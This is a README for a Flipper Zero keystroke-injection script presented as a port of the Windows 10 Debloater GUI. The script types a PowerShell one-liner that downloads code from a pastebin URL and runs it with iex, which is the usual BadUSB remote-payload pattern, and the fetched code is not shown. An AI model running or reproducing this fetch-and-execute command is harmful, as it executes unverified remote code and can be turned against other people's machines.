# Windows 10 Debloater GUI Port for Flipper Zero Bad Keyboard

![Debloater GUI Logo](https://raw.githubusercontent.com/levimac-03/flipper-zero-win10debloater-port/main/Debloater%20GUI.png)

This repository contains a script designed for the Flipper Zero Bad Keyboard that executes the Windows 10 Debloater GUI, originally developed by Richard Newton (Sycnex). 

## Overview

The script automates the execution of a PowerShell command that downloads and runs the Windows 10 Debloater GUI from a specified URL. This tool helps users remove unwanted bloatware and optimize their Windows 10 systems.

### Script.txt

```plaintext
REM Credit: @Levi-M-2024 @Sycnex-2021

DELAY 500
GUI r
DELAY 500
STRING powershell -Command "iex (Invoke-WebRequest -Uri 'https://pastebin.com/raw/854vZ336' -UseBasicP).Content"
ENTER
```

## Installation

**Copy the Script**: Place the script file into the "Bad Keyboard" folder on your Flipper Zero SD card. Ensure your device is running Xtreme firmware.

**Restart Your Flipper Zero**: After copying the file, restart your Flipper Zero to activate the script.

## Usage

Once installed, the script can be executed via the Flipper Zero Bad Keyboard interface. It will automatically open a PowerShell window and run the Debloater GUI.

## Acknowledgements

- Richard Newton (Sycnex) for the original Windows 10 Debloater GUI.
- Levi-M-2024 for porting the script to Flipper Zero.
- The Flipper Zero community for their ongoing support and contributions.

